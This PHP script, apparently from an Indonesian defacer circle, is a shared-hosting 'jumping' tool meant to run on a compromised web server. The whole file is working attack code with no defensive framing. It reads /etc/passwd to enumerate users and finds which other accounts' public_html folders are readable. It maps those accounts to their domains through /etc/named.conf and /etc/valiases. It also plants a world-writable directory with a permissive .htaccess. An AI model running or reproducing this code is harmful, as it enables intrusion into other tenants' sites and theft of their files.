<?php
// Tu5b0l3d
// thx to: IndoXPloit, HNc
// just jumping + domain

error_reporting(0);
echo "<h2>Hanya Liat Readable Apa tidak</h2>";
//$us = file_get_contents("/etc/passwd");
$usa = fopen('/etc/passwd','r');
$dir = mkdir('jump', 0777);
$rrrr = "Options all \n DirectoryIndex jump \n Require None \n Satisfy Any";
$frr = fopen('jump/.htaccess', 'w');

fwrite($frr, $rrrr);
while($us = fgets($usa)){
if($us==""){
	echo "cann't read /etc/passwd";
}
else{
preg_match_all('/(.*?):x:/', $us, $user_byk);

    foreach($user_byk[1] as $user){
    	$dir1 = "/home/$user/public_html/";
    	if(is_readable($dir1)){
           echo "<font color='green'>$dir1 <= Readable</font>";

      $domainns = file_get_contents("/etc/named.conf");
      if($domainns==""){
        echo " | Cann't read /etc/named.conf<br>";
      }
      else{

      preg_match_all("#/var/named/(.*?).db#", $domainns, $domains);
      foreach($domains[1] as $domain){
        
      $user2 = posix_getpwuid(@fileowner("/etc/valiases/$domain"));
      $user2 = $user2['name'];
      if ($user2=="$user"){
        echo ", domain $domain<br>";
        break;
    } 
  }

}
       }
    	else{
    		
    	}

   }

}

}


   ?>
